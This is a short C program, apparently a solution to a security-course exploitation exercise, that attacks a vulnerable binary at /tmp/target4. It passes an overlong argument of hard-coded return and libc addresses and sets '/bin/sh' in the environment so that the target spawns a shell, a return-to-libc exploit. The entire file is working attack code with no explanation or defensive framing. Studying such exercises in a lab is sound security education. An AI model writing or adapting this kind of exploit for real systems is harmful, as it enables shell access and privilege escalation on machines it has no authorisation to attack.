#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target4"

int main(void)
{
  char *args[3]; 
  char *env[1];
  
  args[0] = TARGET;
  
  char rt_arr[20] = "";
  strcat(rt_arr, "\xa0\x3d\xe4\xb7");

  strcat(rt_arr, "\xa0\x3d\xe4\xb7");
  strcat(rt_arr, "\xa0\x3d\xe4\xb7");
  strcat(rt_arr, "\xd0\x79\xe3\xb7");
  strcat(rt_arr, "\xc5\xff\xff\xbf");
 
  args[1] = rt_arr; 
  args[2] = NULL;
  
  env[0] = "YG=/bin/sh";
  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\n");

  return 0;
}


